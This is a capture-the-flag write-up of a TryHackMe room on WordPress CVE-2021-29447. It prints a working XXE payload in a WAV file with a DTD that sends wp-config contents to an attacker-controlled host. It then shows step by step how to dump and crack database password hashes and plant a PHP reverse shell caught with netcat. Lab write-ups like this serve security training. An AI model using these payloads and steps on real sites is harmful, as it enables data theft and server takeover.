---
layout: post
title: "Wordpress-CVE-2021-29447"
date: 2022-10-20
categories: [Tryhackme, Easy-THM]
tags: [wordpress, php, wp-config.php, JTR, hashcat]
image: ../../assets/img/posts/wordpresscve202129447.png 

---

## Description

Vulnerability allow a authenticated user whith low privilages upload a malicious WAV file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF).

|**Room**|[Wordpress-CVE-2021-29447](https://tryhackme.com/room/wordpresscve202129447)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[stuxnet](https://tryhackme.com/p/stuxnet)|

---

Using credentials, we log into webapp,

![image](https://user-images.githubusercontent.com/67465230/187016017-8c10537d-4bda-40d3-a5d0-44a72801399d.png)

Navigating to Media section and select for audio,

![image](https://user-images.githubusercontent.com/67465230/187016023-14dee76e-9b0a-4bdd-9fb1-5210696b08d0.png)

Now, create ".wav" file:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://tun0IP/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > malicious.wav
```

And, create .dtd file:

```bash
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://tun0IP/?p=%file;'>" >
```

Start php server,

```php
php -s 0.0.0.0:80
```

Upload the file and got the callback,

![image](https://user-images.githubusercontent.com/67465230/187016029-97cf98dc-a5c4-4c00-ad64-c8eda9bb644f.png)

Create a file named wp-config.php,

```php
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

![image](https://user-images.githubusercontent.com/67465230/187016040-3d2c4712-fdf0-4377-ba3e-ec85e40e9fc9.png)

Now, we can get the database content out of it,

```php
php wp-config.php | grep -i db
```

![image](https://user-images.githubusercontent.com/67465230/187016050-16108b51-6feb-41f9-a496-48c023918f08.png)

we got database username, password, hostname, name, etc.

Now, we can scan the machine to get open ports,

```bash
nmap -sC -sV -p22,80,3306 10.10.64.14
```

![image](https://user-images.githubusercontent.com/67465230/187016061-c658c76d-c613-461e-8d47-0a314d519709.png)

we get port 22 open and is running ssh service, port 80 is running apache webserver, port 3306 is running mysql service.

We can access mysql database using the credentials we found earlier,

```bash
mysql -h 10.10.64.14 -Dwordpressdb2 -u thedarktangent -p
```

![image](https://user-images.githubusercontent.com/67465230/187016071-db92de81-e6b2-4737-8e84-a5e1f8cfbcaa.png)

We can use these commands to retrieve credentials out of database,

```sql
show databases;
use wordpressdb2;
describe wptry_users;
select user_login, user_pass from wptry_users where id=1;
```

![image](https://user-images.githubusercontent.com/67465230/187016077-77800f68-3654-4247-96d4-ee4af450969f.png)

Now that we have username and password hash, we can use JTR to crack the password,

```bash
john crack --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/187016089-3b3f9f5f-e53a-4b02-a4d7-19a344a1754f.png)

in seconds, the hash gets cracked.

Alternatively, we can use hashcat tool to crack this hash, (_use 400 mode because this is a MD5 wordpress hash_)

```bash
hashcat.exe -a 0 -m 400 crack.txt rockyou.txt -O
```

![image](https://user-images.githubusercontent.com/67465230/187016099-d10eb3d6-62de-4807-9e45-a73c4bbce70e.png)

hashcat will take seconds to crack the hash.

Now, we can login using the credentials we just get,

![image](https://user-images.githubusercontent.com/67465230/187016107-bc60e961-044f-4658-af12-bb9954c63b9a.png)

There is a hello.php file in Plugins -> Plugin Editor -> Hide Only. We will paste the php reverse shell and update the file. 

![image](https://user-images.githubusercontent.com/67465230/187016119-9576c610-a2c1-485c-89e6-42f4e1452999.png)

Now, we need to start a listener using `nc -nvlp 4444` and using curl command to make the request to webserver,

```bash
curl http://10.10.64.14/wp-content/plugins/hello.php
```

we will get a reverse shell as this curl command will trigger the php-reverse-shell,

![image](https://user-images.githubusercontent.com/67465230/187016125-3529c097-5a7f-4b87-be66-183594f6f905.png)

Now, we can improve this shell using sequence of these commands,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
stty rows 38 columns 116
```

Enumerating directory and we found the flag,

![image](https://user-images.githubusercontent.com/67465230/187016136-6125671a-2d34-4f06-b6b3-5b93d2f88293.png)
